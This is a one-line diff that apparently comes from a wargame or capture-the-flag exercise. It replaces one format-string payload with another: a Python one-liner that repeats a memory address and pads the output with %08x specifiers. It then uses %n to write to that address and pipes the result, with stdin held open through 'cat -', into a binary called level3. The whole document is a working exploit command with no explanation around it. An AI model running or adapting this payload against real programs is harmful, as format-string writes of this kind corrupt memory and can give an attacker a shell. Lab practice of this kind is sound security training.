@@ -1,1 +1,1 @@
-python -c 'print "\x8c\x98\x04\x08" * 6 + "%x" * 3 +  "%x" * 3 + "%n"' > /tmp/file
+(python -c 'print "\x8c\x98\x04\x08" * 4 + "%08x" * 6 + "%n"'; cat -) | ./level3
